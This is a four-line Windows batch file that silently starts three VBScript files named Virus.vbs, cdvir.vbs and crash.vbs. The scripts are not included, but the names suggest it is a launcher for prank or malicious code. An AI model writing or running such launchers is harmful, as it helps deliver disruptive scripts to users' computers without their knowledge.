@echo off
start Virus.vbs
start cdvir.vbs
start crash.vbs